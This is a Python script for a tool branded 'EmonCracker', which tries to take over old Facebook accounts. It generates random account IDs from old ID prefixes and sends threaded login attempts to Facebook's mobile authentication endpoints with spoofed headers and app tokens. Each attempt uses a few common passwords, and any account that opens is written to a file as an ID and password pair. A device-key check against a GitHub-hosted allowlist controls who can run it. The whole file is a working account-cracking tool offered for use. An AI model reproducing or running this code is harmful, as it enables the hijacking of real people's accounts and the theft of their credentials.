import os
import sys
import time
import uuid
import platform
import subprocess
import hashlib
import requests
import threading

HOME_DIR = os.path.expanduser("~")
KEY_FILE = os.path.join(HOME_DIR, ".permanent_device_key.txt")

def get_permanent_device_id():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f:
                saved_key = f.read().strip()
                if len(saved_key) == 16:
                    return saved_key
        except Exception:
            pass

    device_raw_id = ""

    try:
        cmd = "getprop ro.serialno || getprop ro.build.id || getprop ro.product.model"
        output = subprocess.check_output(cmd, shell=True).decode().strip()
        if output and "unknown" not in output:
            device_raw_id = output
    except Exception:
        pass

    if not device_raw_id:
        device_raw_id = str(uuid.uuid4())

    permanent_key = hashlib.sha256(device_raw_id.encode()).hexdigest()[:16].upper()

    try:
        with open(KEY_FILE, "w") as f:
            f.write(permanent_key)
    except Exception:
        pass

    return permanent_key

api_result = {"response": None, "error": None}


def fetch_allowed_ids(url):
    global api_result
    headers = {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    }
    try:
        cache_buster_url = f"{url}?timestamp={int(time.time())}"
        response = requests.get(cache_buster_url, headers=headers, timeout=10)
        api_result["response"] = response
    except Exception as e:
        api_result["error"] = e

def check_access():
    RAW_GITHUB_URL = "https://raw.githubusercontent.com/zarar3082-png/EmonCrack/main/.gitignore"

    user_id = get_permanent_device_id()
    os.system("clear")

    api_result["response"] = None
    api_result["error"] = None

    thread = threading.Thread(target=fetch_allowed_ids, args=(RAW_GITHUB_URL,))
    thread.daemon = True
    thread.start()

    print("\033[1;36m[+] Checking Authorization", end="", flush=True)

    start_time = time.time()
    min_loading_time = 3.0

    while True:
        elapsed_time = time.time() - start_time
        if not thread.is_alive() and elapsed_time >= min_loading_time:
            break

        time.sleep(0.25)
        sys.stdout.write(".")
        sys.stdout.flush()

    print("\033[0m\n")

    api_response = api_result["response"]
    api_error = api_result["error"]

    if api_error or api_response is None:
        print("\033[1;31m[-] Internet connection required or Server Error!\033[0m")
        sys.exit()

    if api_response.status_code == 200:
        allowed_ids = [line.strip() for line in api_response.text.splitlines() if line.strip()]

        if user_id in allowed_ids:
            print("\033[1;32m[✓] Access Granted! Welcome.\033[0m\n")
            time.sleep(1)
            return True
        else:
            os.system("clear")
            print("\033[1;31m=================================================\033[0m")
            print("\033[1;31m [X] ACCESS DENIED! [X]")
            print("\033[1;31m [X] YOUR DEVICE KEY IS NOT APPROVED. [X]\033[0m")
            print(f"\033[1;33m [!] Your Device Key : \033[1;37m{user_id}\033[0m")
            print("\033[1;32m [+] Send device key to the owner to get access.\033[0m")
            print("\033[1;32m [+] Tools Owner WhatsApp : \033[1;37m+8801867449221\033[0m")
            print("\033[1;31m=================================================\033[0m")

            sys.exit()
    else:
        print("\033[1;31m[-] Server error! Could not check license.\033[0m")
        sys.exit()
import re
import random
import string
import urllib
from datetime import datetime
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'  # White
rad = '\x1b[38;5;196m'  # Red
G = '\x1b[38;5;46m'  # Green
Y = '\x1b[38;5;220m'  # Yellow
PP = '\x1b[38;5;203m'  # Pink
W = '\x1b[1;37m'  # Bright White


def clear_screen():
    os.system("clear" if os.name != "nt" else "cls")


def linex():
    print(f'{Y}--------------------------------------------------{X}')


def banner():
    clear_screen()
    print(f"""{Y}
==================================================
              🔥 EmonCracker 🔥             
==================================================

      Tool Name : EmonCracker
      Owner     : Emon
      WhatsApp  : +8801867449221

=================================================={X}
""")


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(5, 7))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(8, 12))}.0.{random.choice(range(552, 661))}.0 Safari/534.{aV}"

    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{random.choice(range(1, 36))}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(5, 7))}.{random.choice(['2', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(12, 42))}.0.{random.choice(range(742, 2200))}.{random.choice(range(1, 120))} Safari/{bz}"

    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{random.choice(range(1, 7120))}.0 Safari/537.36"
    return random.choice([A, B, D])


def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"

    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, D])


def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('1000000000', '100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004',
                           '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    return ''


def BNG_71_():
    banner()
    print(f'  {Y}({G}1{Y}) {G}Crack OLD Facebook Account')
    print(f'  {Y}({G}2{Y}) {G}File Cloning (Coming Soon)')
    print(f'  {Y}({G}3{Y}) {G}FreeFire ID Cracking (Coming Soon)')
    linex()

    choice = input(f"{G}======> {G}Choice Method{W}: {Y}").strip()

    if choice in ('1', '01', 'A', 'a'):
        old_clone()
    elif choice in ('2', '02', 'B', 'b'):
        print(f"\n    {rad}[!] Coming soon. Keep supporting us for updates...")
        time.sleep(2)
        BNG_71_()
    elif choice in ('3', '03', 'C', 'c'):
        print(f"\n    {rad}[!] Coming soon. Support us for latest updates...")
        time.sleep(2)
        BNG_71_()
    else:
        print(f"\n    {rad}[!] Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    banner()
    print(f'  {Y}({G}A{Y}) {PP}All Series')
    linex()
    print(f'  {Y}({G}B{Y}) {PP}100003/4 Series')
    linex()
    print(f'  {Y}({G}C{Y}) {PP}2009 Series')
    linex()

    _input = input(f"{G}======> {G}Choice ID-Type{W}: {Y}").strip().upper()

    if _input in ('A', '01', '1'):
        old_One()
    elif _input in ('B', '02', '2'):
        old_Tow()
    elif _input in ('C', '03', '3'):
        old_Tree()
    else:
        print(f"\n    {rad}[×] Choose Valid Option...")
        time.sleep(2)
        old_clone()


def old_One():
    global user
    user = []
    banner()
    print(f"  {G}OLD Code Year list{Y}: {Y}(1) {G}2010-2014 {Y}(2) {G}2011-2015")
    linex()
    ask = input(f"{G}======> {G}SELECT CODE (1/2) {Y}:{G} ").strip()
    linex()
    print(f"  {G}Example for Cloning limit{Y}:{G} 22000/30000/99999")
    linex()
    limit = input(f"{G}======> {G}Enter Limit {Y}:{G} ").strip()
    linex()

    try:
        limit_int = int(limit)
    except ValueError:
        limit_int = 5000

    star = '10000'
    max_range = 1999999999 if ask == '1' else 4999999999
    for _ in range(limit_int):
        data = str(random.choice(range(1000000000, max_range)))
        user.append(star + data)

    print(f'       {PP}(A) {G}METHOD 1')
    print(f'       {PP}(B) {G}METHOD 2')
    linex()
    meth = input(f"{G}======> {G}CHOICE {PP}(A/B): {Y}").strip().upper()

    start_cracking(meth, limit_int)


def old_Tow():
    global user
    user = []
    banner()
    print(f"  {G}Old Series for Cloning {Y}:{G} 100003/4 Series")
    linex()
    print(f"  {G}Example for Cloning limit{Y}:{G} 22000/30000/99999")
    linex()
    limit = input(f"{G}======> {G}Enter Limit {Y}:{G} ").strip()
    linex()

    try:
        limit_int = int(limit)
    except ValueError:
        limit_int = 5000

    prefixes = ['100003', '100004']
    for _ in range(limit_int):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices(string.digits, k=9))
        user.append(prefix + suffix)

    print(f'       {PP}(A) {G}METHOD 1')
    print(f'       {PP}(B) {G}METHOD 1')
    linex()
    meth = input(f"{G}======> {G}CHOICE {PP}(A/B): {Y}").strip().upper()

    start_cracking(meth, limit_int)


def old_Tree():
    global user
    user = []
    banner()
    print(f"  {G}Old Id cloning series {Y}:{G} 2009-2010 Series")
    linex()
    print(f"  {G}Example Input Limit{Y}:{G} 20000/30000/99999")
    limit = input(f"{G}======> {G}Enter Limit {Y}:{G}").strip()
    linex()

    try:
        limit_int = int(limit)
    except ValueError:
        limit_int = 5000

    prefix = '1000004'
    for _ in range(limit_int):
        suffix = ''.join(random.choices(string.digits, k=8))
        user.append(prefix + suffix)

    print(f'  {PP}(A) {G}METHOD A')
    print(f'  {PP}(B) {G}METHOD B')
    linex()
    meth = input(f"{G}======>{G}CHOICE {Y}(A/B): {Y}").strip().upper()

    start_cracking(meth, limit_int)


def start_cracking(meth, limit_count):
    banner()
    print(f"  {PP}(★) {G}Given for cracking: {Y}: {G}{limit_count}{W}")
    print(f"  {PP}(★) {G}VPN/Airplane Mode For Best Results{G}")
    linex()

    with tred(max_workers=30) as pool:
        for uid in user:
            if meth in ('A', '1'):
                pool.submit(login_1, uid)
            elif meth in ('B', '2'):
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def login_1(uid):
    global loop, oks
    session = requests.Session()
    try:
        sys.stdout.write(f"\r\r{Y}({G}EmonCracing-M1{Y})-({G}{loop}{Y})-({G}OK:{len(oks)}{Y})")
        sys.stdout.flush()

        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }

            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers,
                               allow_redirects=False).json()

            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r-->{G}[Cracked-OK] {uid}|{pw}|{creationyear(uid)}")
                with open('/sdcard/EmonCrack-M1-Ok.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                oks.append(uid)
                break

        loop += 1
    except Exception:
        time.sleep(2)
        loop += 1


def login_2(uid):
    global loop, oks
    sys.stdout.write(f"\r\r{Y}({G}EmonCracking-M2{Y})-({G}{loop}{Y})-({G}OK:{len(oks)}{Y})")
    sys.stdout.flush()

    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"

                po = session.get(url, headers=headers).json()

                if 'session_key' in str(po):
                    print(f"\r\r{W}> {G}[Cracked-Ok] {uid} | {pw} | {creationyear(uid)}")
                    with open('/sdcard/EmonCrack-M2-ok.txt', 'a') as f:
                        f.write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass

    loop += 1

check_access()

print("\033[1;32m[+] And Welcome to EmonCrack Tools.....\033[0m")
input("\033[1;36m \n To Start Cloning Please click [↩] Enter--\033[0m")
BNG_71_()
